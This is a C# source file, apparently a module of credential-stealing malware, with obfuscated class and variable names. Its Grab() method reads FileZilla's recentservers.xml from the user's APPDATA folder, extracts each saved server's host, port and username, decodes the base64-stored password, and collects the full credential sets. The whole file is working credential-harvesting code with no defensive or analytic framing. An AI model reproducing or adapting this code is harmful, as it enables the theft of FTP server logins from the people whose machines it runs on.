using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using C6Zy;
using JSW1fecBOy;

namespace rk937aHHc
{
	public class FileZilla : EtbH
	{
		public FileZilla()
		{
			this.cdm4nCs822 = "FileZilla";
		}

		public string cdm4nCs822 { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();
            string filePath = Path.Combine(Environment.GetEnvironmentVariable("APPDATA"), "FileZilla", "recentservers.xml");

            if (!File.Exists(filePath))
                return list;

            string fileContent = File.ReadAllText(filePath);
            string[] servers = fileContent.o1a9sIqIfKj("<Server>");
            if (servers == null)
                return list;

            foreach (string serverXml in servers)
            {
                try
                {
                    WTitxI2m server = new WTitxI2m();

                    if (serverXml.Contains("<Host>"))
                    {
                        string host = g3Vt7T2gk5.Q4YnB9Kv(serverXml, "<Host>", "</Host>");
                        string port = g3Vt7T2gk5.Q4YnB9Kv(serverXml, "<Port>", "</Port>");
                        server.data1 = host + ":" + port;
                    }

                    if (serverXml.Contains("<User>"))
                    {
                        server.data2 = g3Vt7T2gk5.Q4YnB9Kv(serverXml, "<User>", "</User>");
                    }

                    if (serverXml.Contains("<Pass encoding=\"base64\">"))
                    {
                        string passwordBase64 = g3Vt7T2gk5.Q4YnB9Kv(serverXml, "<Pass encoding=\"base64\">", "</Pass>");
                        server.data3 = Encoding.UTF8.GetString(Convert.FromBase64String(passwordBase64));
                    }
                    else if (serverXml.Contains("<Pass>"))
                    {
                        server.data3 = g3Vt7T2gk5.Q4YnB9Kv(serverXml, "<Pass>", "</Pass>");
                    }

                    server.data4 = this.cdm4nCs822;

                    if (!string.IsNullOrEmpty(server.data1) &&
                        !string.IsNullOrEmpty(server.data2) &&
                        !string.IsNullOrEmpty(server.data3))
                    {
                        list.Add(server);
                    }
                }
                catch
                {
                }
            }

            return list;
        }
    }
}
